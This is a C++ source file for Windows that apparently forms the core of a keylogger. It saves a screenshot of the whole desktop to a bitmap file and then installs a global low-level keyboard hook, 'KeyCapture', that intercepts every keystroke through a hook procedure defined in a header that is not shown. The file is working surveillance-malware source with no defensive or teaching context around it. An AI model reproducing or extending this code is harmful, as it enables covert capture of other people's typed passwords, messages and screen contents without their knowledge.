#include <iostream>
#include <Windows.h>
#include <locale.h>

#include "KeyHook.h"

struct WindowPos { long x; long y; long w; long h; } GetForegroungWindowPos() {
    HWND handle = GetForegroundWindow();
    RECT rect;
    GetWindowRect(handle, &rect);

    WindowPos result;
    result.x = rect.left;
    result.y = rect.top;
    result.w = rect.right - rect.left;
    result.h = rect.bottom - rect.top;

    return result;
}

void SetForegroundWindowPos(long x, long y, long w, long h) {
    HWND handle = GetForegroundWindow();
    SetWindowPos(handle, HWND_TOPMOST, x, y, w, h, SWP_DRAWFRAME);
}

bool takeScreenshot(std::string wPath) {
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);

    if (hBitmap != NULL && hMemDC != NULL) {
        SelectObject(hMemDC, hBitmap);
        BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

        hFile = CreateFileA(wPath.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
        WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
        WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);

        CloseHandle(hFile);

        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);

        return true;
    }

    return false;
}

int main(int argc, char** argv) {
    setlocale(LC_ALL, "LATIN");

    takeScreenshot("lel.bmp");

	std::cout << "[*] Starting KeyCapture" << std::endl;

	if (!SetWindowsHookEx(WH_KEYBOARD_LL, HookProcedure, GetModuleHandle(NULL), NULL)) {
		std::cout << "[!] Failed to get handle from SetWindowsHookEx()" << std::endl;
	}
	else {
		std::cout << "[*] KeyCapture handle ready" << std::endl;

		MSG Msg;
		while (GetMessage(&Msg, NULL, 0, 0) > 0) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
	}

	unhookKeyboard();
    return 0;
}